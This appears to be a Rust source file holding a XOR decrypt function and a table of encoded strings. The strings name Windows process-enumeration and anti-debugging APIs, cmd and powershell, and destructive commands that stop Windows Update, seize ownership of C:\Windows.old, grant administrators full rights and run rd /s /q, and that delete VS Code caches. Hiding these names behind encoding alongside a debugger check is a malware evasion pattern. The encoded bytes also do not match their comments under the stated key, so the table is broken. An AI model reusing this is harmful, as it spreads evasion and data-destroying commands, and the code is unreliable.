/// Decrypts a byte array using XOR key 0xAA
pub fn decrypt(bytes: &[u8]) -> String {
    let key = 0xAA;
    let chars: Vec<u8> = bytes.iter().map(|b| b ^ key).collect();
    // Remove null terminators if present for Rust Strings, but keep for C-interop if needed?
    // Actually, String::from_utf8 will fail on interior nulls usually not, but Rust strings don't use nulls.
    // Our C-style strings (ending in \0) passed to Windows API need the null.
    // But for Rust logic (like "cmd"), we don't want the null.
    // The Python script added \0 to KERNEL32 etc.
    // Let's just return the String. The caller can trim matches if it's for comparison, 
    // or if it's for `GetModuleHandleA`, we need the null.
    // Wait, `GetModuleHandleA` takes PCSTR.
    // If we decrypt "kernel32.dll\0", we get a Rust String with a null at the end.
    // checking `contains` might be tricky if we don't handle it.
    // Let's strip trailing nulls for the String return?
    // No, some inputs need it. Caller decides.
    
    String::from_utf8(chars).unwrap_or_default()
}

// "kernel32.dll\0"
pub const KERNEL32: &[u8] = &[209, 207, 216, 200, 207, 206, 179, 178, 180, 206, 206, 206, 170]; 
// "CreateToolhelp32Snapshot\0"
pub const SNAPSHOT: &[u8] = &[195, 216, 207, 195, 214, 207, 238, 203, 203, 206, 194, 207, 206, 210, 179, 178, 233, 200, 195, 210, 217, 194, 203, 214, 170]; 
// "Process32First\0"
pub const PROC_FIRST: &[u8] = &[234, 216, 203, 195, 207, 217, 217, 179, 178, 198, 201, 216, 217, 214, 170]; 
// "Process32Next\0"
pub const PROC_NEXT: &[u8] = &[234, 216, 203, 195, 207, 217, 217, 179, 178, 204, 207, 218, 214, 170]; 
// "explorer"
pub const EXPLORER: &[u8] = &[207, 218, 210, 206, 203, 216, 207, 216]; 
// "cmd"
pub const CMD: &[u8] = &[195, 201, 206]; 
// "powershell"
pub const POWERSHELL: &[u8] = &[210, 203, 215, 207, 216, 217, 194, 207, 206, 206]; 
// "services"
pub const SERVICES: &[u8] = &[217, 207, 216, 210, 201, 195, 207, 217]; 
// "python"
pub const PYTHON: &[u8] = &[210, 219, 214, 194, 203, 200]; 
// "IsDebuggerPresent\0"
pub const IS_DEBUGGER: &[u8] = &[195, 217, 198, 207, 194, 213, 199, 199, 207, 216, 234, 216, 207, 217, 207, 200, 214, 170]; 
// "runas"
pub const RUNAS: &[u8] = &[216, 213, 200, 195, 217]; 
// "C:\Windows\SoftwareDistribution\Download"
pub const WUPDATE_DIR: &[u8] = &[195, 186, 246, 237, 201, 200, 206, 203, 215, 217, 246, 233, 203, 198, 214, 215, 195, 216, 207, 198, 201, 217, 216, 216, 201, 203, 200, 246, 198, 203, 215, 200, 206, 203, 195, 206]; 
// "net"
pub const NET: &[u8] = &[200, 207, 214]; 
// "stop"
pub const STOP: &[u8] = &[217, 214, 203, 210]; 
// "start"
pub const START: &[u8] = &[217, 214, 195, 216, 214]; 
// "wuauserv"
pub const WUAUSERV: &[u8] = &[215, 213, 195, 213, 217, 207, 216, 210]; 
// "C:\Windows.old"
pub const WIN_OLD: &[u8] = &[195, 186, 246, 237, 201, 200, 206, 203, 215, 217, 174, 203, 206, 206]; 
// "takeown"
pub const TAKEOWN: &[u8] = &[214, 195, 205, 207, 203, 215, 200]; 
// "icacls"
pub const ICACLS: &[u8] = &[201, 195, 195, 195, 206, 217]; 
// "rd"
pub const RD: &[u8] = &[216, 206]; 
// "APPDATA"
pub const APPDATA: &[u8] = &[195, 234, 234, 198, 195, 212, 195]; 
// "LOCALAPPDATA"
pub const LOCALAPPDATA: &[u8] = &[206, 203, 195, 195, 206, 195, 234, 234, 198, 195, 212, 195]; 
// "Code\CachedData"
pub const VS_CACHE: &[u8] = &[195, 203, 206, 207, 246, 195, 195, 195, 194, 207, 206, 198, 195, 214, 195]; 
// "Code\User\workspaceStorage"
pub const VS_WORKSPACE: &[u8] = &[195, 203, 206, 207, 246, 239, 217, 207, 216, 246, 215, 203, 216, 205, 217, 210, 195, 195, 207, 233, 214, 203, 216, 195, 205, 207]; 
// "Code\Cache"
pub const VS_CODE_CACHE: &[u8] = &[195, 203, 206, 207, 246, 195, 195, 195, 194, 207]; 
// "Code\Code Cache"
pub const VS_CODE_CACHE2: &[u8] = &[195, 203, 206, 207, 246, 195, 203, 206, 207, 162, 195, 195, 195, 194, 207]; 
// "/grant administrators:F /T /C /Q"
pub const GRANT_ADMIN: &[u8] = &[175, 205, 216, 195, 200, 214, 162, 195, 206, 201, 201, 200, 203, 217, 214, 216, 195, 214, 203, 216, 217, 186, 196, 162, 175, 212, 162, 175, 195, 162, 175, 209]; 
// "/F C:\Windows.old /R /A /D Y"
pub const TAKEOWN_ARGS: &[u8] = &[175, 196, 162, 195, 186, 246, 237, 201, 200, 206, 203, 215, 217, 174, 203, 206, 206, 162, 175, 210, 162, 175, 195, 162, 175, 198, 162, 233]; 
// "/s /q"
pub const RD_ARGS: &[u8] = &[175, 217, 162, 175, 219];
